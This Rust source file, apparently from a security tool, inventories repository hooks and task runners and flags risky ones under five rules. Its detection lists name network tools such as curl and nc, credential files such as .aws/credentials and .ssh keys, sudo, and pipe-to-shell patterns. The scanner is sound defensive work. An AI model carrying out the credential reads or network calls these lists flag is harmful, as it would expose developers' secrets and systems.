//! Repo-hook + automation inventory and risk classification (M9 ch6).
//!
//! This module inventories the executable surfaces a repository can run on your
//! behalf — git hooks, husky/lefthook/pre-commit hooks, package-manager
//! lifecycle scripts, direnv `.envrc`, mise/asdf tool hooks — plus the
//! "automation" surfaces a developer runs by hand (`Makefile`, `justfile`,
//! `Taskfile.yml`). It powers `tirith hooks scan|guard|explain`.
//!
//! ## Two surfaces, two entry points
//!
//! 1. **Full inventory** ([`scan_for_repo`] / [`scan_for_cwd`]) — enumerates
//!    EVERY surface (hooks + automation) and classifies each body. This is what
//!    `tirith hooks scan` calls. Static read only: a hook is read as text and
//!    classified, never executed.
//!
//! 2. **Hot-path leader-targeted scan** ([`scan_triggered_by_leader`]) — given a
//!    parsed command leader (`git`, `npm`, `direnv`, …) and its subcommand,
//!    scans ONLY the hook types that leader actually triggers. `git commit`
//!    checks `pre-commit` / `prepare-commit-msg` / `commit-msg`, NOT `pre-push`
//!    and NOT the `Makefile` (the user did not invoke `make`). This keeps the
//!    engine hot path narrow. The engine gates this behind
//!    `policy.hooks_guard_enabled`.
//!
//! ## The 5 rules are externally triggered
//!
//! The five rules — [`crate::verdict::RuleId::RepoHookNetworkCall`],
//! [`RepoHookCredentialRead`](crate::verdict::RuleId::RepoHookCredentialRead),
//! [`RepoHookSudo`](crate::verdict::RuleId::RepoHookSudo),
//! [`RepoHookSuspiciousShellPattern`](crate::verdict::RuleId::RepoHookSuspiciousShellPattern),
//! [`RepoHookExternalFetch`](crate::verdict::RuleId::RepoHookExternalFetch) —
//! fire from this scanner. The three that can fire on the engine hot path
//! (network call / credential read / sudo, surfaced when `hooks_guard_enabled`
//! is set) still carry no PATTERN_TABLE entry — the trigger is repo STATE plus
//! a hot-path git/package-manager command, not a regex on the user's input.
//! All five live in `EXTERNALLY_TRIGGERED_RULES`, covered by unit tests here
//! against `tempfile::tempdir()` roots.
//!
//! ## Cache (hot-path perf)
//!
//! [`scan_triggered_by_leader`] consults a process-global, repo-root-keyed cache
//! with a 60s TTL ([`HOOK_CACHE_TTL`]). The cache is additionally keyed on the
//! aggregate mtime of the scanned surfaces, so editing a hook invalidates it
//! immediately. A `git pull` / `git checkout` (which can rewrite hooks /
//! configs) explicitly busts the cache via [`invalidate_cache_for`].

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};
use std::sync::Mutex;
use std::time::{Duration, Instant, SystemTime};

use serde::{Deserialize, Serialize};

use crate::verdict::{RuleId, Severity};

/// How long a hot-path leader-targeted scan is cached, keyed by repo root +
/// surface mtime fingerprint. Re-running a git/package-manager command within
/// this window reuses the cached classification instead of re-reading every
/// hook file. The full `tirith hooks scan` inventory bypasses the cache.
pub const HOOK_CACHE_TTL: Duration = Duration::from_secs(60);

/// Whether a surface is a *hook* (run automatically by a tool on a lifecycle
/// event) or *automation* (a task runner the developer invokes by hand). The
/// scan output keeps the two categories separate: hooks are the auto-exec
/// attack surface, automation is reported for inventory completeness only.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum HookCategory {
    /// Auto-executed on a tool lifecycle event (git hook, husky, lefthook,
    /// pre-commit, npm lifecycle script, `.envrc`, mise/asdf hook).
    Hook,
    /// A task runner the developer invokes explicitly (`make`, `just`, `task`).
    /// NOT auto-scanned per package-manager command; inventoried only by the
    /// explicit `tirith hooks scan`.
    Automation,
}

impl HookCategory {
    pub fn as_str(self) -> &'static str {
        match self {
            HookCategory::Hook => "hook",
            HookCategory::Automation => "automation",
        }
    }
}

/// Which tool owns a surface. Drives `explain` output and the per-leader
/// targeting (e.g. only `Git` + `Husky` + `Lefthook` + `PreCommit` surfaces are
/// triggered by a `git commit`).
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum HookProvider {
    /// `.git/hooks/<name>`.
    Git,
    /// `.husky/<name>`.
    Husky,
    /// `lefthook.yml` (a config that names commands per git event).
    Lefthook,
    /// `.pre-commit-config.yaml`.
    PreCommit,
    /// `package.json` lifecycle script (`preinstall`/`install`/`postinstall`/`prepare`).
    PackageJson,
    /// `.envrc` (direnv).
    Direnv,
    /// `mise.toml` / `.mise.toml` / `.tool-versions` (asdf/mise tool hooks).
    Mise,
    /// `Makefile`.
    Makefile,
    /// `justfile` / `Justfile`.
    Justfile,
    /// `Taskfile.yml` / `Taskfile.yaml`.
    Taskfile,
}

impl HookProvider {
    pub fn as_str(self) -> &'static str {
        match self {
            HookProvider::Git => "git",
            HookProvider::Husky => "husky",
            HookProvider::Lefthook => "lefthook",
            HookProvider::PreCommit => "pre-commit",
            HookProvider::PackageJson => "package.json",
            HookProvider::Direnv => "direnv",
            HookProvider::Mise => "mise/asdf",
            HookProvider::Makefile => "makefile",
            HookProvider::Justfile => "justfile",
            HookProvider::Taskfile => "taskfile",
        }
    }

    fn category(self) -> HookCategory {
        match self {
            // Task runners + mise/asdf tool hooks are reported under
            // "automation" (the spec: mise/asdf are NOT auto-scanned per
            // package-manager command; they're inventory-only like make/just).
            HookProvider::Makefile
            | HookProvider::Justfile
            | HookProvider::Taskfile
            | HookProvider::Mise => HookCategory::Automation,
            _ => HookCategory::Hook,
        }
    }
}

/// One enumerated hook / automation surface, with its body and any findings.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RepoHookEntry {
    /// Display name of the hook / surface (`pre-commit`, `postinstall`,
    /// `Makefile`, `.envrc`, …).
    pub name: String,
    /// hook vs automation.
    pub category: HookCategory,
    /// Owning tool.
    pub provider: HookProvider,
    /// The file the body was read from.
    pub source_path: PathBuf,
    /// The (possibly large) body text classified. Empty when the file could not
    /// be read as UTF-8 text. NEVER printed verbatim by the CLI — it is
    /// credential-redacted at the presentation layer.
    pub body: String,
    /// The git lifecycle event(s) this surface triggers on, when applicable
    /// (`pre-commit`, `pre-push`, …). Used by the per-leader hot-path targeting.
    /// Empty for automation surfaces and package lifecycle scripts.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub git_events: Vec<String>,
    /// Findings against this entry's body.
    pub findings: Vec<RepoHookFinding>,
}

impl RepoHookEntry {
    /// `true` when any finding against this entry is High or Critical.
    pub fn has_high(&self) -> bool {
        self.findings.iter().any(RepoHookFinding::is_high)
    }

    /// Highest severity across this entry's findings, if any.
    pub fn max_severity(&self) -> Option<Severity> {
        self.findings.iter().map(|f| f.severity).max()
    }
}

/// A single risk finding emitted for a [`RepoHookEntry`].
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RepoHookFinding {
    /// The rule that fired.
    pub rule_id: RuleId,
    /// Severity.
    pub severity: Severity,
    /// Hook / surface name the finding is about.
    pub name: String,
    /// Owning tool.
    pub provider: HookProvider,
    /// Human-readable location (full file path).
    pub location: String,
    /// Short description of *why* the rule fired. Echoes a matched token, never
    /// the surrounding body (which may carry a secret).
    pub detail: String,
}

impl RepoHookFinding {
    pub fn is_high(&self) -> bool {
        matches!(self.severity, Severity::High | Severity::Critical)
    }
}

/// Full result of a hook inventory scan.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct RepoHookScan {
    /// The repo root that was scanned (display form). `None` when no `.git`
    /// boundary / scan root was resolvable.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub repo_root: Option<String>,
    /// Every surface discovered (hooks first, then automation).
    pub entries: Vec<RepoHookEntry>,
}

impl RepoHookScan {
    /// All findings flattened across every entry.
    pub fn all_findings(&self) -> Vec<&RepoHookFinding> {
        self.entries
            .iter()
            .flat_map(|e| e.findings.iter())
            .collect()
    }

    /// `true` when any entry carries a High/Critical finding (drives exit 1).
    pub fn has_high(&self) -> bool {
        self.entries.iter().any(RepoHookEntry::has_high)
    }

    /// Count of entries in each category.
    pub fn category_counts(&self) -> (usize, usize) {
        let hooks = self
            .entries
            .iter()
            .filter(|e| e.category == HookCategory::Hook)
            .count();
        let automation = self.entries.len() - hooks;
        (hooks, automation)
    }
}

// ─── public entry points ─────────────────────────────────────────────────────

/// Full inventory scan of the repo containing the current working directory.
/// Resolves the repo root via [`crate::policy::find_repo_root`]; if there is no
/// `.git` boundary, the cwd itself is used as the scan root so a non-git project
/// (a bare checkout, a worktree) still gets `Makefile` / `package.json` /
/// `.envrc` coverage. Returns an empty scan when no root resolves.
pub fn scan_for_cwd() -> RepoHookScan {
    let root = crate::policy::find_repo_root(None).or_else(|| std::env::current_dir().ok());
    match root {
        Some(r) => scan_for_repo(&r),
        None => RepoHookScan::default(),
    }
}

/// Testable full-inventory entry point: enumerate + classify every hook /
/// automation surface under `repo_root`. Static read only; never executes a
/// hook. Tests pass a `tempfile::tempdir()` path here.
pub fn scan_for_repo(repo_root: &Path) -> RepoHookScan {
    let entries = collect_all(repo_root);
    RepoHookScan {
        repo_root: Some(repo_root.display().to_string()),
        entries,
    }
}

/// Look up a single surface by name (`pre-commit`, `postinstall`, `Makefile`,
/// …) for `tirith hooks explain`. Returns every matching entry (a name like
/// `pre-commit` can exist under `.git/hooks`, `.husky`, AND `lefthook.yml`).
pub fn explain_for_cwd(name: &str) -> Vec<RepoHookEntry> {
    let scan = scan_for_cwd();
    scan.entries
        .into_iter()
        .filter(|e| e.name == name)
        .collect()
}

/// Testable `explain` entry point.
pub fn explain_for_repo(repo_root: &Path, name: &str) -> Vec<RepoHookEntry> {
    scan_for_repo(repo_root)
        .entries
        .into_iter()
        .filter(|e| e.name == name)
        .collect()
}

/// Hot-path leader-targeted scan. Given the resolved repo root, the command
/// leader (`git`, `npm`, `yarn`, `pnpm`, `direnv`), and the leader's first
/// subcommand argument, return the findings ONLY for the hook surfaces that
/// leader actually triggers.
///
/// Returns `None` when the leader is not a hook-triggering command (so the
/// engine can skip the whole path cheaply). Returns `Some(vec![])` when the
/// leader IS hook-triggering but no triggered hook carries a finding.
///
/// Per-leader targeting (the load-bearing scope decision):
/// - `git commit` → `pre-commit`, `prepare-commit-msg`, `commit-msg`,
///   `post-commit` (git + husky + lefthook + pre-commit).
/// - `git push` → `pre-push`.
/// - `git pull` / `git merge` / `git rebase` / `git checkout` → `post-merge`,
///   `post-checkout`, `post-rewrite` (the events these emit); the cache is
///   INVALIDATED first because these can rewrite hooks / configs.
/// - `npm/yarn/pnpm install|ci|run` → `package.json` lifecycle scripts only.
/// - `direnv allow|reload` → `.envrc` only.
///
/// `Makefile` / `justfile` / `Taskfile` are NEVER returned here — the user did
/// not invoke `make`/`just`/`task`. They are inventory-only.
pub fn scan_triggered_by_leader(
    repo_root: &Path,
    leader: &str,
    subcommand: Option<&str>,
) -> Option<Vec<RepoHookFinding>> {
    let target = LeaderTarget::resolve(leader, subcommand)?;

    // `git pull`/`checkout`/`merge`/`rebase` can rewrite hooks — bust the cache
    // so the next scan re-reads from disk.
    if target.invalidate_cache {
        invalidate_cache_for(repo_root);
    }

    let scan = cached_scan(repo_root);

    let findings = scan
        .entries
        .iter()
        .filter(|e| target.matches(e))
        .flat_map(|e| e.findings.iter().cloned())
        .collect();
    Some(findings)
}

/// `true` when `leader` + `subcommand` form a hook-triggering command
/// (`git commit`, `npm install`, `direnv allow`, …). Cheap, allocation-light
/// predicate the engine uses to decide whether to force past the tier-1
/// fast-exit when `hooks_guard_enabled` is set — without it, a clean-looking
/// `git commit` would never reach the hot-path hook scan.
pub fn is_hook_triggering_leader(leader: &str, subcommand: Option<&str>) -> bool {
    LeaderTarget::resolve(leader, subcommand).is_some()
}

/// What a hot-path leader triggers. Built by [`LeaderTarget::resolve`]; `None`
/// when the leader is not a hook-triggering command.
struct LeaderTarget {
    /// Git lifecycle events the leader fires (empty for non-git leaders).
    git_events: &'static [&'static str],
    /// Whether `package.json` lifecycle scripts are triggered.
    package_lifecycle: bool,
    /// Whether `.envrc` (direnv) is triggered.
    direnv: bool,
    /// Whether to bust the cache before scanning (git pull/checkout/merge/rebase).
    invalidate_cache: bool,
}

impl LeaderTarget {
    fn resolve(leader: &str, subcommand: Option<&str>) -> Option<Self> {
        // Normalize the leader to its basename (a `/usr/bin/git` leader still
        // counts), lowercased for case-insensitive matching of e.g. `GIT`.
        let leader = leader_basename(leader).to_ascii_lowercase();
        let sub = subcommand.map(|s| s.to_ascii_lowercase());
        let sub = sub.as_deref();

        match leader.as_str() {
            "git" => {
                let events: &'static [&'static str] = match sub {
                    Some("commit") => &[
                        "pre-commit",
                        "prepare-commit-msg",
                        "commit-msg",
                        "post-commit",
                    ],
                    Some("push") => &["pre-push"],
                    Some("pull") | Some("merge") => &["post-merge"],
                    Some("rebase") => &["post-rewrite"],
                    Some("checkout") => &["post-checkout"],
                    _ => return None,
                };
                let invalidate = matches!(
                    sub,
                    Some("pull") | Some("merge") | Some("rebase") | Some("checkout")
                );
                Some(LeaderTarget {
                    git_events: events,
                    package_lifecycle: false,
                    direnv: false,
                    invalidate_cache: invalidate,
                })
            }
            "npm" => match sub {
                Some("install") | Some("i") | Some("ci") | Some("run") | Some("run-script") => {
                    Some(LeaderTarget {
                        git_events: &[],
                        package_lifecycle: true,
                        direnv: false,
                        invalidate_cache: false,
                    })
                }
                _ => None,
            },
            "yarn" | "pnpm" => match sub {
                // `yarn`/`pnpm` with no subcommand also installs.
                None | Some("install") | Some("ci") => Some(LeaderTarget {
                    git_events: &[],
                    package_lifecycle: true,
                    direnv: false,
                    invalidate_cache: false,
                }),
                _ => None,
            },
            "direnv" => match sub {
                Some("allow") | Some("reload") => Some(LeaderTarget {
                    git_events: &[],
                    package_lifecycle: false,
                    direnv: true,
                    invalidate_cache: false,
                }),
                _ => None,
            },
            _ => None,
        }
    }

    /// `true` when `entry` is one of the surfaces this leader triggers.
    fn matches(&self, entry: &RepoHookEntry) -> bool {
        match entry.provider {
            HookProvider::PackageJson => self.package_lifecycle,
            HookProvider::Direnv => self.direnv,
            HookProvider::Git
            | HookProvider::Husky
            | HookProvider::Lefthook
            | HookProvider::PreCommit => {
                // Match by git event when this leader fires git events.
                !self.git_events.is_empty()
                    && (entry.git_events.iter().any(|e| self.git_events.contains(&e.as_str()))
                        // A git/husky hook whose NAME is the event but which we
                        // could not tag with a git_event still matches by name.
                        || self.git_events.contains(&entry.name.as_str()))
            }
            // Automation (Makefile/justfile/Taskfile) + mise/asdf are never
            // triggered by a package-manager / git / direnv command.
            HookProvider::Makefile
            | HookProvider::Justfile
            | HookProvider::Taskfile
            | HookProvider::Mise => false,
        }
    }
}

/// The basename of a leader token (`/usr/bin/git` → `git`, `git` → `git`).
fn leader_basename(leader: &str) -> &str {
    let leader = leader.trim_matches(|c: char| c == '"' || c == '\'');
    leader
        .rsplit(['/', '\\'])
        .next()
        .filter(|s| !s.is_empty())
        .unwrap_or(leader)
}

// ─── cache ─────────────────────────────────────────────────────────────────────

/// One cached full-inventory scan, keyed by repo root + a surface mtime
/// fingerprint. The fingerprint busts the cache the moment any scanned hook
/// file changes; the TTL bounds staleness for never-touched repos.
struct HookCacheEntry {
    root: PathBuf,
    fingerprint: u64,
    at: Instant,
    scan: RepoHookScan,
}

static HOOK_CACHE: Mutex<Option<HookCacheEntry>> = Mutex::new(None);

/// Return a cached inventory for `repo_root` when one is fresh (same root, same
/// mtime fingerprint, within [`HOOK_CACHE_TTL`]); otherwise scan and cache.
fn cached_scan(repo_root: &Path) -> RepoHookScan {
    let fingerprint = surface_fingerprint(repo_root);

    if let Ok(guard) = HOOK_CACHE.lock() {
        if let Some(entry) = guard.as_ref() {
            if entry.root == repo_root
                && entry.fingerprint == fingerprint
                && entry.at.elapsed() < HOOK_CACHE_TTL
            {
                return entry.scan.clone();
            }
        }
    }

    let scan = scan_for_repo(repo_root);

    if let Ok(mut guard) = HOOK_CACHE.lock() {
        *guard = Some(HookCacheEntry {
            root: repo_root.to_path_buf(),
            fingerprint,
            at: Instant::now(),
            scan: scan.clone(),
        });
    }

    scan
}

/// Drop any cached scan for `repo_root`. Called before a `git pull`/`checkout`/
/// `merge`/`rebase` targeted scan, since those commands can rewrite hooks.
pub fn invalidate_cache_for(repo_root: &Path) {
    if let Ok(mut guard) = HOOK_CACHE.lock() {
        if guard.as_ref().map(|e| e.root == repo_root).unwrap_or(false) {
            *guard = None;
        }
    }
}

/// Combine the mtimes of the hook-bearing surfaces into a single fingerprint.
/// A change to any surface (or adding/removing one) changes the value, busting
/// the cache. Cheap: a handful of `stat`s on small, well-known paths.
fn surface_fingerprint(repo_root: &Path) -> u64 {
    use std::hash::Hasher;
    let mut hasher = std::collections::hash_map::DefaultHasher::new();

    // The set of paths whose mtime feeds the fingerprint. Directories are
    // walked one level (their entries' mtimes matter).
    let git_hooks = repo_root.join(".git/hooks");
    if let Ok(rd) = std::fs::read_dir(&git_hooks) {
        for entry in rd.flatten() {
            fingerprint_path(&entry.path(), &mut hasher);
        }
    }
    let husky = repo_root.join(".husky");
    if let Ok(rd) = std::fs::read_dir(&husky) {
        for entry in rd.flatten() {
            fingerprint_path(&entry.path(), &mut hasher);
        }
    }
    for rel in SINGLE_FILE_SURFACES {
        fingerprint_path(&repo_root.join(rel), &mut hasher);
    }
    hasher.finish()
}

fn fingerprint_path(path: &Path, hasher: &mut impl std::hash::Hasher) {
    use std::hash::Hash;
    if let Ok(md) = std::fs::metadata(path) {
        if let Ok(mtime) = md.modified() {
            if let Ok(dur) = mtime.duration_since(SystemTime::UNIX_EPOCH) {
                path.to_string_lossy().hash(hasher);
                dur.as_nanos().hash(hasher);
                md.len().hash(hasher);
            }
        }
    }
}

/// Single-file surfaces whose mtime feeds the cache fingerprint (and which
/// `collect_all` reads).
const SINGLE_FILE_SURFACES: &[&str] = &[
    "lefthook.yml",
    "lefthook.yaml",
    ".pre-commit-config.yaml",
    ".pre-commit-config.yml",
    "package.json",
    ".envrc",
    "mise.toml",
    ".mise.toml",
    ".tool-versions",
    "Makefile",
    "makefile",
    "justfile",
    "Justfile",
    "Taskfile.yml",
    "Taskfile.yaml",
];

// ─── collection ──────────────────────────────────────────────────────────────

/// Enumerate every hook / automation surface under `repo_root`.
fn collect_all(repo_root: &Path) -> Vec<RepoHookEntry> {
    let mut entries = Vec::new();

    collect_git_hooks(repo_root, &mut entries);
    collect_husky(repo_root, &mut entries);
    collect_lefthook(repo_root, &mut entries);
    collect_pre_commit(repo_root, &mut entries);
    collect_package_json(repo_root, &mut entries);
    collect_direnv(repo_root, &mut entries);
    collect_mise(repo_root, &mut entries);
    collect_automation(repo_root, &mut entries);

    entries
}

/// The git hooks that are real lifecycle hooks (not the `*.sample` files git
/// ships). We read any non-`.sample` file in `.git/hooks`.
fn collect_git_hooks(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
    let dir = repo_root.join(".git/hooks");
    let Ok(rd) = std::fs::read_dir(&dir) else {
        return;
    };
    for entry in rd.flatten() {
        let path = entry.path();
        let Some(name) = path.file_name().and_then(|n| n.to_str()) else {
            continue;
        };
        // Skip git's shipped samples — they are inert until renamed.
        if name.ends_with(".sample") {
            continue;
        }
        if !path.is_file() {
            continue;
        }
        let body = read_text(&path).unwrap_or_default();
        push_entry(
            out,
            name.to_string(),
            HookProvider::Git,
            path.clone(),
            body,
            vec![name.to_string()],
        );
    }
}

/// husky v5+ stores one script per git-event filename under `.husky/`
/// (`.husky/pre-commit`, …). `.husky/_/` is husky's own bootstrap dir — skip it.
fn collect_husky(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
    let dir = repo_root.join(".husky");
    let Ok(rd) = std::fs::read_dir(&dir) else {
        return;
    };
    for entry in rd.flatten() {
        let path = entry.path();
        let Some(name) = path.file_name().and_then(|n| n.to_str()) else {
            continue;
        };
        if name.starts_with('_') || name.starts_with('.') {
            continue; // .husky/_/, .gitignore, etc.
        }
        if !path.is_file() {
            continue;
        }
        let body = read_text(&path).unwrap_or_default();
        push_entry(
            out,
            name.to_string(),
            HookProvider::Husky,
            path.clone(),
            body,
            vec![name.to_string()],
        );
    }
}

/// `lefthook.yml` names commands per git event. We treat the whole config as one
/// classifiable body per top-level git event we can find, so a `run:` line with
/// a `curl` fires. Best-effort YAML-ish parse: we scan for top-level event keys
/// and attribute the command lines under each to that event.
fn collect_lefthook(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
    for rel in ["lefthook.yml", "lefthook.yaml"] {
        let path = repo_root.join(rel);
        let Some(contents) = read_text(&path) else {
            continue;
        };
        for (event, body) in lefthook_events(&contents) {
            push_entry(
                out,
                event.clone(),
                HookProvider::Lefthook,
                path.clone(),
                body,
                vec![event],
            );
        }
        return; // only one lefthook config
    }
}

/// Extract `(git_event, body)` blocks from a lefthook config. A top-level key
/// that names a known git event (`pre-commit:`, `pre-push:`, …) starts a block;
/// every more-indented line until the next top-level key is its body.
fn lefthook_events(contents: &str) -> Vec<(String, String)> {
    let mut out: Vec<(String, String)> = Vec::new();
    let mut current: Option<(String, String)> = None;
    for line in contents.lines() {
        let trimmed = line.trim_start();
        let indent = line.len() - trimmed.len();
        // A top-level key (no indent) ending in `:` may start an event block.
        if indent == 0 {
            if let Some(key) = trimmed.strip_suffix(':').map(str::trim) {
                if GIT_EVENTS.contains(&key) {
                    if let Some(c) = current.take() {
                        out.push(c);
                    }
                    current = Some((key.to_string(), String::new()));
                    continue;
                }
            }
            // A different top-level key ends the current block.
            if let Some(c) = current.take() {
                out.push(c);
            }
            continue;
        }
        if let Some((_, body)) = current.as_mut() {
            body.push_str(line);
            body.push('\n');
        }
    }
    if let Some(c) = current.take() {
        out.push(c);
    }
    out
}

/// `.pre-commit-config.yaml` names hook repos + `entry:` commands. We classify
/// the whole file body under the `pre-commit` event (the default stage) plus any
/// explicit `stages:` we recognize. Best-effort: the body is the full file, so a
/// local `entry: curl …` fires.
fn collect_pre_commit(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
    for rel in [".pre-commit-config.yaml", ".pre-commit-config.yml"] {
        let path = repo_root.join(rel);
        let Some(contents) = read_text(&path) else {
            continue;
        };
        push_entry(
            out,
            "pre-commit".to_string(),
            HookProvider::PreCommit,
            path.clone(),
            contents,
            vec!["pre-commit".to_string()],
        );
        return;
    }
}

/// `package.json` lifecycle scripts (`preinstall`/`install`/`postinstall`/
/// `prepare`). Each becomes its own entry (no git event — they fire on
/// `npm install`). Parsed with `serde_json`; a malformed manifest is skipped.
fn collect_package_json(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
    let path = repo_root.join("package.json");
    let Some(contents) = read_text(&path) else {
        return;
    };
    let Ok(value) = serde_json::from_str::<serde_json::Value>(&contents) else {
        return;
    };
    let Some(scripts) = value.get("scripts").and_then(|s| s.as_object()) else {
        return;
    };
    const LIFECYCLE: &[&str] = &["preinstall", "install", "postinstall", "prepare"];
    for key in LIFECYCLE {
        if let Some(cmd) = scripts.get(*key).and_then(|v| v.as_str()) {
            push_entry(
                out,
                (*key).to_string(),
                HookProvider::PackageJson,
                path.clone(),
                cmd.to_string(),
                Vec::new(),
            );
        }
    }
}

/// `.envrc` (direnv) — auto-sourced on `cd` after `direnv allow`. The whole file
/// is the body.
fn collect_direnv(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
    let path = repo_root.join(".envrc");
    let Some(contents) = read_text(&path) else {
        return;
    };
    push_entry(
        out,
        ".envrc".to_string(),
        HookProvider::Direnv,
        path,
        contents,
        Vec::new(),
    );
}

/// mise / asdf tool hooks: `mise.toml` / `.mise.toml` carry `[hooks]` / `[env]`
/// run lines; `.tool-versions` is asdf's plugin list. Reported under the
/// "automation" category per the spec (not auto-scanned per package command).
fn collect_mise(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
    let surfaces: &[(&str, HookProvider)] = &[
        ("mise.toml", HookProvider::Mise),
        (".mise.toml", HookProvider::Mise),
        (".tool-versions", HookProvider::Mise),
    ];
    collect_named_surfaces(repo_root, surfaces, out);
}

/// Automation task runners: `Makefile`, `justfile`, `Taskfile.yml`. Reported
/// under "automation" — inventory only, never auto-scanned by a package command.
fn collect_automation(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
    let surfaces: &[(&str, HookProvider)] = &[
        ("Makefile", HookProvider::Makefile),
        ("makefile", HookProvider::Makefile),
        ("justfile", HookProvider::Justfile),
        ("Justfile", HookProvider::Justfile),
        ("Taskfile.yml", HookProvider::Taskfile),
        ("Taskfile.yaml", HookProvider::Taskfile),
    ];
    collect_named_surfaces(repo_root, surfaces, out);
}

/// Read each `(relative_name, provider)` surface under `repo_root`, deduplicated
/// by canonical path. The dedup matters on case-insensitive filesystems (macOS,
/// Windows) where `Makefile` and `makefile` — or `mise.toml` listed twice —
/// resolve to the SAME file; without it the same surface would be inventoried
/// (and double-classified) more than once.
fn collect_named_surfaces(
    repo_root: &Path,
    surfaces: &[(&str, HookProvider)],
    out: &mut Vec<RepoHookEntry>,
) {
    let mut seen: Vec<PathBuf> = Vec::new();
    for (rel, provider) in surfaces {
        let path = repo_root.join(rel);
        let Some(contents) = read_text(&path) else {
            continue;
        };
        // Canonicalize for the dedup key; fall back to the literal path.
        let canon = path.canonicalize().unwrap_or_else(|_| path.clone());
        if seen.contains(&canon) {
            continue;
        }
        seen.push(canon);
        let name = path
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or(rel)
            .to_string();
        push_entry(out, name, *provider, path, contents, Vec::new());
    }
}

/// Build + classify an entry, appending it to `out`. Classification runs the
/// five rules over the body.
fn push_entry(
    out: &mut Vec<RepoHookEntry>,
    name: String,
    provider: HookProvider,
    source_path: PathBuf,
    body: String,
    git_events: Vec<String>,
) {
    let category = provider.category();
    let location = source_path.display().to_string();
    let findings = classify_body(&name, provider, &location, &body);
    out.push(RepoHookEntry {
        name,
        category,
        provider,
        source_path,
        body,
        git_events,
        findings,
    });
}

// ─── classification (the 5 rules) ──────────────────────────────────────────────

/// Run the five repo-hook rules over a hook body. Order: the High rules first,
/// then the Medium rules, so the most severe finding is listed first.
fn classify_body(
    name: &str,
    provider: HookProvider,
    location: &str,
    body: &str,
) -> Vec<RepoHookFinding> {
    let mut out = Vec::new();
    if body.trim().is_empty() {
        return out;
    }

    let mk = |rule_id: RuleId, severity: Severity, detail: String| RepoHookFinding {
        rule_id,
        severity,
        name: name.to_string(),
        provider,
        location: location.to_string(),
        detail,
    };

    // Rule 1 — network call (High): curl / wget / nc / ncat / netcat as a
    // command word.
    if let Some(tool) = body_network_tool(body) {
        out.push(mk(
            RuleId::RepoHookNetworkCall,
            Severity::High,
            format!("hook body invokes `{tool}` (network call)"),
        ));
    }

    // Rule 2 — credential read (High): references a well-known credential path.
    if let Some(target) = body_reads_credential(body) {
        out.push(mk(
            RuleId::RepoHookCredentialRead,
            Severity::High,
            format!("hook body references credential path `{target}`"),
        ));
    }

    // Rule 3 — sudo (High): a `sudo` command word.
    if contains_command_word(body, "sudo") {
        out.push(mk(
            RuleId::RepoHookSudo,
            Severity::High,
            "hook body uses `sudo` (privilege escalation)".to_string(),
        ));
    }

    // Rule 4 — suspicious shell pattern (Medium): pipe-to-interpreter or
    // base64-decode-then-exec inside the hook.
    if let Some(detail) = body_suspicious_shell_pattern(body) {
        out.push(mk(
            RuleId::RepoHookSuspiciousShellPattern,
            Severity::Medium,
            detail,
        ));
    }

    // Rule 5 — external fetch (Medium): fetches an external resource via a
    // non-curl/wget downloader or a URL handed to a package/script fetcher.
    // Reported only when the network-call rule did NOT already fire on
    // curl/wget (those are the High path); this catches the other fetchers.
    if let Some(detail) = body_external_fetch(body) {
        out.push(mk(RuleId::RepoHookExternalFetch, Severity::Medium, detail));
    }

    out
}

/// Network tools a hook body must not silently invoke. Returns the first match.
fn body_network_tool(body: &str) -> Option<&'static str> {
    const TOOLS: &[&str] = &["curl", "wget", "nc", "ncat", "netcat"];
    TOOLS
        .iter()
        .find(|&&tool| contains_command_word(body, tool))
        .copied()
}

/// Credential-path fragments a hook body must not read. Returns the first match.
fn body_reads_credential(body: &str) -> Option<String> {
    // Specific sub-paths / filenames: a plain substring match is safe — these
    // are distinctive enough that a false positive is implausible.
    const SPECIFIC: &[&str] = &[
        ".aws/credentials",
        ".aws/config",
        ".ssh/id_",
        ".netrc",
        ".npmrc",
        ".pypirc",
        ".docker/config.json",
        ".kube/config",
        ".git-credentials",
        ".config/gh/hosts.yml",
    ];
    for frag in SPECIFIC {
        if body.contains(frag) {
            return Some((*frag).to_string());
        }
    }
    // Bare credential roots: match ONLY at a path boundary so `.env` does not
    // fire on `.environment` / `development.env-example`, and `.ssh` / `.aws`
    // do not fire on `mydir.sshconfig`. A match requires the fragment to be
    // followed by a path separator, end-of-token, or a quote — i.e. it is the
    // last component or a directory in a referenced path.
    const BARE_ROOTS: &[&str] = &[".aws", ".ssh", ".env"];
    for frag in BARE_ROOTS {
        if references_bare_root(body, frag) {
            return Some((*frag).to_string());
        }
    }
    None
}

/// `true` when `frag` (a bare credential root like `.env` / `.ssh`) appears in
/// `body` as a path component: preceded by a path/whitespace boundary AND
/// followed by `/`, whitespace, a quote, end-of-string, or `.` (for `.env.local`
/// / `.env.production`). Avoids the `.environment` / `.sshconfig` false positive
/// that a plain `contains` would hit.
fn references_bare_root(body: &str, frag: &str) -> bool {
    let bytes = body.as_bytes();
    let flen = frag.len();
    let mut idx = 0;
    while let Some(rel) = body[idx..].find(frag) {
        let pos = idx + rel;
        let before_ok = pos == 0
            || matches!(
                bytes[pos - 1],
                b' ' | b'\t'
                    | b'|'
                    | b';'
                    | b'&'
                    | b'('
                    | b'`'
                    | b'='
                    | b'\n'
                    | b'/'
                    | b'"'
                    | b'\''
                    | b'$'
                    | b'~'
            );
        let after = pos + flen;
        let after_ok = after >= bytes.len()
            || matches!(
                bytes[after],
                b'/' | b' '
                    | b'\t'
                    | b'|'
                    | b';'
                    | b'&'
                    | b')'
                    | b'`'
                    | b'\n'
                    | b'\r'
                    | b'"'
                    | b'\''
                    | b'.'
            );
